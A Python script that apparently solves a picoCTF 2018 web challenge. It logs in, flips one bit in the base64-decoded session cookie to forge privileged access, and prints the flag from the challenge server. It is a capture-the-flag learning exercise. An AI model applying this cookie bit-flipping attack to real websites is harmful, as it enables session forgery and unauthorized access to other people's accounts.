from requests import *
import base64
from bs4 import BeautifulSoup

s = Session()
url = 'http://2018shell.picoctf.com:56265/login'
data = {
    'user': '123',
    'password': '123'
}

r = s.post(url, data=data)
url = 'http://2018shell.picoctf.com:56265/flag'
headers = {
    'Host': '2018shell.picoctf.com:56265',
    'Referer': 'http://2018shell.picoctf.com:56265/'
}

r = s.get(url, headers=headers)
cookies = str.encode(s.cookies['cookie'])

base64_decode_cookie = base64.b64decode(cookies)
b = bytearray(base64_decode_cookie)
b[10] ^= 0x1
base64_decode_cookie = bytes(b)
base64_encode_cookie = base64.b64encode(base64_decode_cookie).decode('utf-8')
cookies = {
    'cookie' : base64_encode_cookie
}

r = s.get(url , cookies=cookies)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('code').get_text()
print(flag)
